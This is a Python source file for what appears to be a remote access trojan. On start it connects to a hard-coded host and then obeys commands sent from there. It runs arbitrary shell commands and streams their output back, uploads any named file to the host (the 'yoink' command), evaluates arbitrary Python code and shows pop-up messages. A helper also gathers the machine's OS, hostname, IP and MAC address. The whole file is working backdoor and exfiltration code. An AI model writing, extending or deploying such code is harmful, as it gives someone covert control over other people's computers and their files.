import json
import platform
import re
import socket
import subprocess
import sys
import threading
import os
import time
import uuid
import requests
import psutil

try:
    import tkinter.messagebox
except:
    pass
ip = "192.168.0.45"
def capture_output(source):
    while True:
        line = source.readline().replace("\u02d9", " ")
        if not line:
            break
        print(line, end="")
        requests.post(f"http://{ip}:43/console_output", json={"message": line})
        time.sleep(0.01)

def run_and_capture_output(command):
    try:
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            shell=True
        )

        stdout_thread = threading.Thread(target=capture_output, args=(process.stdout, ))
        stderr_thread = threading.Thread(target=capture_output, args=(process.stderr, ))

        stdout_thread.start()
        stderr_thread.start()

        stdout_thread.join()
        stderr_thread.join()

        process.wait()

        return process.returncode
    except Exception as e:
        return -1


def help():
    return "Available utilities: getSystemInfo()"
def getSystemInfo():
    try:
        info= {'OS type': platform.system(),
               'OS release': platform.release(),
               'OS version': platform.version(),
               'Architecture': platform.machine(),
               'PC name': socket.gethostname(),
               'Local IP address': socket.gethostbyname(socket.gethostname()),
               'Mac address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
               'Processor': platform.processor(),
               'Ram': str(round(psutil.virtual_memory().total / (1024.0 ** 2))) + " MB"}
        return json.dumps(info)
    except Exception:
        return "Failed!"

def showmessage(message):
    tkinter.messagebox.showinfo("Message", message)


url = f"http://{ip}:43/upload"
class main:
    def __init__(self):
        super().__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, 44))
        print("connected to server")
        while True:
            command = self.s.recv(65535).decode().split()
            #print(command)
            if command[0] == "exec":
                #print(" ".join(command[1:]))
                try:
                    # "powershell "+
                    threading.Thread(target=run_and_capture_output, args=(" ".join(command[1:]), )).start()
                except:
                    #print(sys.exc_info())
                    self.s.send(b"An error occoured! | " + str(sys.exc_info()).encode())

            elif command[0] == "yoink":
                try:
                    path = " ".join(command[1:])
                except:
                    self.s.send(b"Error while parsing filename")
                    continue
                try:
                    with open(path, 'rb') as fobj:
                        response = requests.post(url, files={'file': fobj})
                        if response.status_code == 200:
                            self.s.send(b"Done!")
                        else:
                            self.s.send(f"Upload failed with core {response.status_code}".encode())

                except:
                    self.s.send(b"File upload failed!")
                    continue
            elif command[0].casefold() == "python":
                try:
                    data = " ".join(command[1:])
                except:
                    self.s.send(b"Failed to parse eval() request")
                    continue
                try:
                    #print(data)
                    resp = eval(data)
                except:
                    self.s.send(f"Executing eval() request failed: {sys.exc_info()}".encode())
                    continue
                if type(resp) == list or type(resp) == tuple:
                    self.s.send(b"> "+"\n> ".join(resp).encode())
                elif type(resp) == str or type(resp) == int:
                    self.s.send(str(resp).encode())
                else:
                    self.s.send(b"eval() output is not in the right format! ("+str(type(resp)).encode()+b" instead of list, tuple, str, int)")
            elif command[0].casefold() == "message":
                threading.Thread(target=showmessage, args=(" ".join(command[1:]), )).start()




if __name__ == '__main__':
    try:
        main()
    except OSError:
        print(sys.exc_info())
        os._exit(0)
